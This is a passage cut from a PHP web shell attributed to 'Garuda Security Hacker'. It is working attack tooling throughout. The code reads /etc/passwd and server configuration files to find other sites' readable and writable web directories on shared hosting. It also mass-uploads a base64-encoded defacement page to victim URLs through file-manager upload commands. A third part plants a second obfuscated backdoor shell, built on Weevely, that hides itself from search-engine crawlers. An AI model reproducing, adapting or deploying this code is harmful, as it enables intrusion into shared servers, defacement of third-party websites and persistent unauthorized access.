							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
} elseif($_GET['do'] == 'autoklik') {
?>
<br>
<img src=https://t4.rbxcdn.com/67fc8ab927721ad4757c2f341478b338 height=200 width=230 >

<br>
<font color ="white"><b>Auto Deface Ini akan Generate File Deface Atas Nama Garuda Security Hacker</font></b><br><br>
<form method="post">
<input type="submit" name="x" value="index.php">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
	foreach($target as $korban) {
		$global = "index.php";
		$isi_nama_doang = "PGh0bWw+DQo8Ym9keSBvbkxvYWQ9InR5cGVfdGV4dCgpIiA7IGJnQ29sb3I9IzAwMDAwMCI+DQo8Y2VudGVyPjxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cHM6Ly9wYnMudHdpbWcuY29tL3Byb2ZpbGVfaW1hZ2VzLzE0NDE5OTE2OTQvYmxhY2toYXRfaWNvbl80MDB4NDAwLmpwZyIgdHlwZT0iaW1hZ2UveC1pY29uIi8+DQo8dGl0bGU+SGFja2VkIEJ5IEdhcnVkYSBTZWN1cml0eSBIYWNrZXI8L3RpdGxlPjxicj4NCjxmb250IGNvbG9yID0gIndoaXRlIj5IYWNrZWQgQnkgR2FydWRhIFNlY3VyaXR5IEhhY2tlcjwvZm9udD48YnI+DQo8aW1nIHNyYz1odHRwczovLzMuYnAuYmxvZ3Nwb3QuY29tLy1Kamx1Wnhrc2NCOC9XSGVNOXRHZFFmSS9BQUFBQUFBQURoay9mZmVLakEwVll4UUV0Z3A5UWZHTzdmbndpVkszaHBFT2dDTGNCL3M0MDAvTG9nbyUyQkdTSCUyQmJhcnUlMkJjb3B5LnBuZyBoZWlnaHQ9MjAwIHdpZHRoPTI1MCA+DQo8YnI+PGZvbnQgY29sb3IgPSAid2hpdGUiPldlIEFyZSBPbmx5IFNpbXBsZSBUZWFtIEFuZCBOb3QgVW5kZXJncm91bmQgVGVhbTwvZm9udD4NCjxicj48YnI+PGZvbnQgY29sb3IgPSAid2hpdGUiPl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXzwvZm9udD4NCjxtYXJxdWVlIGRpcmVjdGlvbj0idXAiPjxjZW50ZXI+DQo8Zm9udCBjb2xvcj0icmVkIj5ZdWtpbm9zaGl0YSA0Nzxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPl9UdWFuMkZheV8gPGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPlNub296ZTxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPk91dHJhZ2VvdXNFbmdrdXM8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9InJlZCI+VE1fNDA0PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+RTdCXzQwNDxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5MdWNrTnV0PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+WE00MDRSUyE8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9InJlZCI+TG9zY2FyZG96TWFuZG96YSBhLmsuYSBTaGFkb3dIZWFydHMgPGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+Q3liZXJHaG9zdC4xNzxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5MeW9uYzxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPkV2aWxDbG93bjxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5TZWN0b3IgVjI8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9IndoaXRlIj5Nci5TcG9uZ2Vib2I8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9InJlZCI+RDM0RF9TTDMzUDxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPk1yLkx1Y2lmZXJ6PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPk1SLkJsYW5rMDA3PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+TXIuQnVnZ2Vyczxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5EYXJrVGVycm9yaXp0PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+TWFmaWEgQm95PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPkZhemxhc3Q8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9IndoaXRlIj5Nci5TZWNyZXR6PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPk1yLk4oKXRmb3VuZDxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPk1yLkh6QTQwNEVzTDxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5QMzRDRUIwWTxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPk1yX1ZpcnV6ZXIjMjk8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9InJlZCI+NExWMU5fNDA0PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+TXIuT2tveTQ4PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPkxveW8tSUQ8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9IndoaXRlIj5BbmQgQWxsIE1lbWJlciBvZiBHYXJ1ZGEgU2VjdXJpdHkgSGFja2VyPC9mb250Pg0KPC9jZW50ZXI+DQo8L21hcnF1ZWU+DQo8L2NlbnRlcj4NCjwvaHRtbD4NCg==";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done index.php<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
<form method="post">
<input type="submit" name="s" value="gsh.php">
</form>
<?php
$targets = explode("\r\n", $_POST['targets']);
if($_POST['s']) {
	foreach($targets as $korba) {
		$globa = "gsh.php";
		$isi_nama = "PGh0bWw+DQo8Ym9keSBvbkxvYWQ9InR5cGVfdGV4dCgpIiA7IGJnQ29sb3I9IzAwMDAwMCI+DQo8Y2VudGVyPjxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cHM6Ly9wYnMudHdpbWcuY29tL3Byb2ZpbGVfaW1hZ2VzLzE0NDE5OTE2OTQvYmxhY2toYXRfaWNvbl80MDB4NDAwLmpwZyIgdHlwZT0iaW1hZ2UveC1pY29uIi8+DQo8dGl0bGU+SGFja2VkIEJ5IEdhcnVkYSBTZWN1cml0eSBIYWNrZXI8L3RpdGxlPjxicj4NCjxmb250IGNvbG9yID0gIndoaXRlIj5IYWNrZWQgQnkgR2FydWRhIFNlY3VyaXR5IEhhY2tlcjwvZm9udD48YnI+DQo8aW1nIHNyYz1odHRwczovLzMuYnAuYmxvZ3Nwb3QuY29tLy1Kamx1Wnhrc2NCOC9XSGVNOXRHZFFmSS9BQUFBQUFBQURoay9mZmVLakEwVll4UUV0Z3A5UWZHTzdmbndpVkszaHBFT2dDTGNCL3M0MDAvTG9nbyUyQkdTSCUyQmJhcnUlMkJjb3B5LnBuZyBoZWlnaHQ9MjAwIHdpZHRoPTI1MCA+DQo8YnI+PGZvbnQgY29sb3IgPSAid2hpdGUiPldlIEFyZSBPbmx5IFNpbXBsZSBUZWFtIEFuZCBOb3QgVW5kZXJncm91bmQgVGVhbTwvZm9udD4NCjxicj48YnI+PGZvbnQgY29sb3IgPSAid2hpdGUiPl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXzwvZm9udD4NCjxtYXJxdWVlIGRpcmVjdGlvbj0idXAiPjxjZW50ZXI+DQo8Zm9udCBjb2xvcj0icmVkIj5ZdWtpbm9zaGl0YSA0Nzxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPl9UdWFuMkZheV8gPGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPlNub296ZTxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPk91dHJhZ2VvdXNFbmdrdXM8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9InJlZCI+VE1fNDA0PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+RTdCXzQwNDxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5MdWNrTnV0PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+WE00MDRSUyE8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9InJlZCI+TG9zY2FyZG96TWFuZG96YSBhLmsuYSBTaGFkb3dIZWFydHMgPGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+Q3liZXJHaG9zdC4xNzxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5MeW9uYzxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPkV2aWxDbG93bjxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5TZWN0b3IgVjI8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9IndoaXRlIj5Nci5TcG9uZ2Vib2I8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9InJlZCI+RDM0RF9TTDMzUDxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPk1yLkx1Y2lmZXJ6PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPk1SLkJsYW5rMDA3PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+TXIuQnVnZ2Vyczxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5EYXJrVGVycm9yaXp0PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+TWFmaWEgQm95PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPkZhemxhc3Q8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9IndoaXRlIj5Nci5TZWNyZXR6PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPk1yLk4oKXRmb3VuZDxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPk1yLkh6QTQwNEVzTDxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0icmVkIj5QMzRDRUIwWTxicj48L2ZvbnQ+DQo8Zm9udCBjb2xvcj0id2hpdGUiPk1yX1ZpcnV6ZXIjMjk8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9InJlZCI+NExWMU5fNDA0PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJ3aGl0ZSI+TXIuT2tveTQ4PGJyPjwvZm9udD4NCjxmb250IGNvbG9yPSJyZWQiPkxveW8tSUQ8YnI+PC9mb250Pg0KPGZvbnQgY29sb3I9IndoaXRlIj5BbmQgQWxsIE1lbWJlciBvZiBHYXJ1ZGEgU2VjdXJpdHkgSGFja2VyPC9mb250Pg0KPC9jZW50ZXI+DQo8L21hcnF1ZWU+DQo8L2NlbnRlcj4NCjwvaHRtbD4NCg==";
		$decode_isi = base64_decode($isi_nama);
		$encode = base64_encode($globa);
		$ss = fopen($globa,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' targets='_blank'>$korba</a> <br>";
		echo "Done gsh.php<br>";
		$url_mkfil = "$korba?cmd=mkfile&name=$globa&targets=l1_Lw";
 		$post1 = array(
				"targets" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$globa",);
 		$output_mkfil = ngirim("$korban", $post1);
			$upload_as = ngirim("$korban?cmd=upload", $post2);
			}
		}
} elseif($_GET['do'] == 'pe') { ?>
<br>
<h2><font color = "white">Let's Plant Something Nice Baby</font><br></h2>
<img src=http://25.media.tumblr.com/tumblr_mdhrs21z7H1rfltito1_1280.jpg height=250 width=400 >
<br><br>
<form method="post">
<input type="submit" name="x" value="PLANT GSH CLI SHELL">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
	foreach($target as $korban) {
		$global = "gshcli.php";
		$isi_nama_doang = "PD9waHANCi8vIENvcHlyaWdodCBTaGVldCBEb250IFJlbW92ZSBpZiB5b3UgUmVhbCBIdW1hbg0KLy8gU2hlbGwgaW5pIGJ1a2FuIHNlcGVudWggbnlhIG11cm5pIGJ1YXRhbiBzZW5kaXJpDQovLyBhbHVyIGNvZGluZyBkYW4gYmViZXJhcGEgcmVzb3VyY2UNCi8vIG1hc2loIG1lbmdndW5ha2FuIHlhbmcgc3VkYWggYWRhIHNlYmVsdW1ueWENCi8vIG5hbXVuIGltcGxlbWVudGFzaSBpZGUgZGFuIGtyZWFzaSBueWEgbXVybmkNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vCS8vDQovLwlHYXJ1ZGEgU2VjdXJpdHkgSGFja2VyIENvbW1hbmQgTGluZSBTaGVsbCAvLw0KLy8JLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vIC8vDQovLyBDcmVhdGVkIGJ5IDogWXVraW5vc2hpdGEgNDcgLy8NCi8vIFZlcnNpb24gOiAxLjAgLy8NCi8vIFRlYW0gOiBHYXJ1ZGEgU2VjdXJpdHkgSGFja2VyIC8vDQovLyBSZXNvdXJjZSA6IEdvb2dsZSwgR2l0aHViLCBBbmQgVzNTaG9vbHMgLy8NCi8vIFNpdGUgOiAqIGdhcnVkYXNlY3VyaXR5aGFja2VyLmJsb2dzcG90LmNvbSAvLw0KLy8JKiBiaXRvc2kuY29tIC8vDQovLwkvLw0KLy8gIk5vIEFybXkgQ2FuIFN0b3AgSWRlYSIgLy8NCi8vCS8vDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQo/Pg0KPD8NCi8vIGluaSBzY3JpcHQgd2VldmVseSBzZWJhaWsgbnlhIGFuZGEgaGFwdXMgamlrYSBtZXJhc2EgdGlkYWsgZGlwZXJsdWthbg0KLy8gc2NyaXB0IHdlZXZlbHkgZ3VuYSBueWEgdW50dWsgYmFja2Nvbm5lY3Qgc2hlbGwgaW5pIGRlbmdhbiB3ZWV2ZWx5IG55YQ0KLy8gY2FyYSBrb25layBzaGVsbCBpbmkgdmlhIHRlcm1pbmFsDQovLyByb290QGhhY2tlcjogIyB3ZWV2ZWx5IDx1cmw+IDxwYXNzd29yZD4NCi8vIHJvb3RAaGFja2VyOiAjIGNvbnRvaCB3ZWV2ZWxleSBzaXR1cy5jby5saS9zaGVsbC5waHAgZ3NoMTMzNw0KLy8gYnVhdCB5YW5nIG5nZXJ0aSBhamEgeWEgOnANCi8vIGJhZ2kgeWFuZyBzZXJpbmcgcGFrZSB3ZWV2ZWx5IHNlYmFpayBueWEgZ2FudGkgc2NyaXB0IGRpYmF3YWgNCi8vIGRlbmdhbiBzY3JpcHQgd2VldmVseSB5YW5nIGFuZGEgZ2VuZXJhdGUgc2VuZGlyaSBkZW1pIGtlYW1hbmFuIGFuZGENCi8vIGNhcmkgdHV0b3JpYWwgZGkgZ29vZ2xlIG1lbmdlbmFpIHdlZXZlbHkNCiRodnNhPSJ5a3NJR3B2YVc0b1lYSnlZWGxmanNjMnhwWTJVb2pzSkdFc2pzSkdNb0pHRWpzcExUTXBLU2twS1R0bFkyaHZJQ2M4THljanN1SkdzdUp6NG5PMzBqcz0iOw0KJHNoaHU9IjNKbGpzY0dqc3hoWTJVanNvWVhKeVlYa29KeTlianNYbHgzUFZqc3h6WFM4bkxDY3ZYSE12Snlrc0lHRnljanNtRmpzNUtDY25qc0xDY3JKIjsNCiRoZ3F1ID0gc3RyX3JlcGxhY2UoImxoIiwiIiwibGhzbGh0bGhybGhfbGhyZXBsaGxsaGFsaGNsaGUiKTsNCiR0ZGtxPSJHanNFcFBqTWpzcGV5UnJqc1BTZG9NVE1qc3pOeWM3WldOb2J5QWpzblBDY3VKR3N1Sno0bk8yVjJZanNXd29ZanNtRnpaVFkwWDJqc1JsWTI5a1pTaHdjbVZuWCI7DQokcXd1bz0iSkdNOUoyanNOdmRXNTBKenNrWWpzVDBrWDBOUFQwdEpqc1JUdHBaaWhqc3laWE5qc2xkQ2drWVNqc2s5UFNqc2RuY3ljZ0ppWWdqc0pHTW9KIjsNCiR1aHlkID0gJGhncXUoInEiLCAiIiwgInFicWFxc2VxNjRxX3FkcWVxY3FvcWRlIik7DQokZXpvaSA9ICRoZ3F1KCJzIiwiIiwic2NzcmVzYXRzZV9zZnN1bnNjc3Rpb24iKTsNCiRqbWxxID0gJGV6b2koJycsICR1aHlkKCRoZ3F1KCJqcyIsICIiLCAkcXd1by4kdGRrcS4kc2hodS4kaHZzYSkpKTsgJGptbHEoKTsNCj8+DQo8Pw0Kc2Vzc2lvbl9zdGFydCgpOw0KZXJyb3JfcmVwb3J0aW5nKDApOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQpAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOw0KQGNsZWFyc3RhdGNhY2hlKCk7DQpAaW5pX3NldCgnZXJyb3JfbG9nJyxOVUxMKTsNCkBpbmlfc2V0KCdsb2dfZXJyb3JzJywwKTsNCkBpbmlfc2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnLDApOw0KQGluaV9zZXQoJ291dHB1dF9idWZmZXJpbmcnLDApOw0KQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQokYXV0aF9wYXNzID0gImNkMTQ5ZTZkODkzMWIxMmJlNzljYzZiNWJkMzk0Y2I5IjsgLy8gZGVmYXVsdDogZ3NoMTMzNw0KJGNvbG9yID0gIiMwMGZmMDAiOw0KJGRlZmF1bHRfYWN0aW9uID0gJ2hvbWUnOw0KJGRlZmF1bHRfdXNlX2FqYXggPSB0cnVlOw0KJGRlZmF1bHRfY2hhcnNldCA9ICdVVEYtOCc7DQppZighZW1wdHkoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKSkgew0KJHVzZXJBZ2VudHMgPSBhcnJheSgiR29vZ2xlYm90IiwgIlNsdXJwIiwgIk1TTkJvdCIsICJQeWNVUkwiLCAiZmFjZWJvb2tleHRlcm5hbGhpdCIsICJpYV9hcmNoaXZlciIsICJjcmF3bGVyIiwgIllhbmRleCIsICJSYW1ibGVyIiwgIllhaG9vISBTbHVycCIsICJZYWhvb1NlZWtlciIsICJiaW5nYm90Iik7DQppZihwcmVnX21hdGNoKCcvJyAuIGltcGxvZGUoJ3wnLCAkdXNlckFnZW50cykgLiAnL2knLCAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKSB7DQpoZWFkZXIoJ0hUVFAvMS4wIDQwNCBOb3QgRm91bmQnKTsNCmV4aXQ7DQp9DQp9DQpmdW5jdGlvbiBsb2dpbl9zaGVsbCgpIHsNCj8+DQo8aHRtbD4NCjxoZWFkPg0KPGxpbmsgcmVsPSJpY29uIiBocmVmPSJodHRwOi8vdmlnbmV0dGUzLndpa2lhLm5vY29va2llLm5ldC9maW5hbGZhbnRhc3kvaW1hZ2VzL2IvYjIvRkZYX2JvbWJfcmVuZGVyLnBuZy9yZXZpc2lvbi9sYXRlc3Q/Y2I9MjAxMjA3MjIxODU4MzkiIHR5cGU9ImltYWdlL3gtaWNvbiIvPg0KPHRpdGxlPlsgR1NIIENMSSBTaGVsbCAxLjAgXTwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KaHRtbCB7DQptYXJnaW46IDIwcHggYXV0bzsNCmJhY2tncm91bmQ6ICMwMDAwMDA7DQpjb2xvcjogZ3JlZW47DQp0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQpoZWFkZXIgew0KY29sb3I6IGdyZWVuOw0KbWFyZ2luOiAxMHB4IGF1dG87DQp9DQppbnB1dFt0eXBlPXBhc3N3b3JkXSB7DQpib3JkZXI6IDFweCBzb2xpZCAjZjAwOw0KcGFkZGluZzogMTBweDsNCmJhY2tncm91bmQ6ICMwMDA7DQpjb2xvcjogd2hpdGU7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGNlbnRlcj4NCjxpbWcgc3JjPWh0dHBzOi8vNC5icC5ibG9nc3BvdC5jb20vLVN3dTJIR21BTHJvL1dHUGtfT3JJVlhJL0FBQUFBQUFBQVFRL1BLQjV2MUxxV3hVVXR5cFFxMHhXTE91XzQtd3JTUnpWd0NMY0IvczE2MDAvZ3NoJTJCY29kZXIuanBnIGhlaWdodD0zMDAgd2lkdGg9NjUwPg0KPGJyPjxicj48Yj48Zm9udCBmYWNlPSJhcmlhbCIgY29sb3I9InJlZCIgc2l6ZT0iMyI+R2FydWRhIFNlY3VyaXR5IEhhY2tlcjwvZm9udD4mbmJzcDs8Zm9udCBmYWNlPSJhcmlhbCIgY29sb3I9IndoaXRlIiBzaXplPSIzIj5XZWIgQmFja2Rvb3IgQWNjZXNzIFsgQ0xJIFNoZWxsIDEuMCBdIDwvZm9udD48L2I+DQo8YnI+DQo8YnI+DQo8Zm9ybSBtZXRob2Q9InBvc3QiPg0KPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIj4NCjwvZm9ybT4NCjxicj48Yj48Zm9udCBmYWNlPSJhcmlhbCIgY29sb3I9InJlZCIgc2l6ZT0iMyI+V2UgSG9wZSBZb3UgRW5qb3kgVGhpcyBTdHVmZjwvZm9udD4mbmJzcDs8Zm9udCBmYWNlPSJhcmlhbCIgY29sb3I9IndoaXRlIiBzaXplPSIzIj5BbmQgQXMgQWx3YXlzIEhhdmUgTmljZSBEYXk8L2ZvbnQ+PC9iPg0KPGJyPjxicj4NCjw/cGhwDQpleGl0Ow0KfQ0KaWYoIWlzc2V0KCRfU0VTU0lPTlttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKV0pKQ0KaWYoIGVtcHR5KCRhdXRoX3Bhc3MpIHx8ICggaXNzZXQoJF9QT1NUWydwYXNzJ10pICYmIChtZDUoJF9QT1NUWydwYXNzJ10pID09ICRhdXRoX3Bhc3MpICkgKQ0KJF9TRVNTSU9OW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pXSA9IHRydWU7DQplbHNlDQpsb2dpbl9zaGVsbCgpOw0KaWYoaXNzZXQoJF9HRVRbJ2ZpbGUnXSkgJiYgKCRfR0VUWydmaWxlJ10gIT0gJycpICYmICgkX0dFVFsnYWN0J10gPT0gJ2Rvd25sb2FkJykpIHsNCkBvYl9jbGVhbigpOw0KJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KaGVhZGVyKCdDb250ZW50LURlc2NyaXB0aW9uOiBGaWxlIFRyYW5zZmVyJyk7DQpoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJyk7DQpoZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInLmJhc2VuYW1lKCRmaWxlKS4nIicpOw0KaGVhZGVyKCdFeHBpcmVzOiAwJyk7DQpoZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IG11c3QtcmV2YWxpZGF0ZScpOw0KaGVhZGVyKCdQcmFnbWE6IHB1YmxpYycpOw0KaGVhZGVyKCdDb250ZW50LUxlbmd0aDogJyAuIGZpbGVzaXplKCRmaWxlKSk7DQpyZWFkZmlsZSgkZmlsZSk7DQpleGl0Ow0KfQ0KPz4NCjxodG1sPg0KPHN0eWxlPg0KLyogdW52aXNpdGVkIGxpbmsgKi8NCmE6bGluayB7DQpjb2xvcjogeWVsbG93Ow0KfQ0KLyogdmlzaXRlZCBsaW5rICovDQphOnZpc2l0ZWQgew0KY29sb3I6IGN5YW47DQp9DQovKiBtb3VzZSBvdmVyIGxpbmsgKi8NCmE6aG92ZXIgew0KY29sb3I6IHdoaXRlOw0KfQ0KLyogc2VsZWN0ZWQgbGluayAqLw0KYTphY3RpdmUgew0KY29sb3I6IGdyZWVuOw0KfQ0KYm9keSB7DQpiYWNrZ3JvdW5kLWltYWdlOiB1cmwoImh0dHA6Ly93d3cucHVibGljZG9tYWlucGljdHVyZXMubmV0L3BpY3R1cmVzLzQwMDAwL3ZlbGthL2RhcmstYmFja2dyb3VuZC5qcGciKTsNCmJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQpjb2xvcjogI0ZGMDAwMDsNCnRleHQtYWxpZ246IGNlbnRlcjsNCmZvbnQtZmFtaWx5OiBoZWx2ZXRpY2E7DQpmb250LXNpemU6IDE0cHg7DQptYXJnaW46IDEwJSBhdXRvIGF1dG8gYXV0bzsNCn0NCiNwZXNhbiB7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOw0Kd2lkdGg6IDgwJTsNCnBhZGRpbmc6IDIwcHg7DQpib3JkZXI6IDJweCBzb2xpZCAjZjAwOw0KbWFyZ2luOiAwcHggYXV0byBhdXRvIGF1dG87DQp9DQp0YWJsZSwgdGQsIHRoIHsNCmJhY2tncm91bmQtY29sb3I6IGJsYWNrOw0KYm9yZGVyOiAxcHggc29saWQgI2VlZTsNCnRleHQtYWxpZ246IGxlZnQ7DQp9DQp0YWJsZSB7DQpib3JkZXItY29sbGFwc2U6IGNvbGxhcHNlOw0Kd2lkdGg6IDEwMCU7DQp9DQp0aCwgdGQgew0KcGFkZGluZzogMXB4Ow0KfQ0KPC9zdHlsZT4NCjxsaW5rIHJlbD0iaWNvbiIgaHJlZj0iaHR0cDovL3ZpZ25ldHRlMy53aWtpYS5ub2Nvb2tpZS5uZXQvZmluYWxmYW50YXN5L2ltYWdlcy9iL2IyL0ZGWF9ib21iX3JlbmRlci5wbmcvcmV2aXNpb24vbGF0ZXN0P2NiPTIwMTIwNzIyMTg1ODM5IiB0eXBlPSJpbWFnZS94LWljb24iLz4NCjx0aXRsZT5HU0ggQ2xpIFNoZWxsPC90aXRsZT4NCjxkaXYgaWQ9InBlc2FuIj4NCjxiPjxmb250IG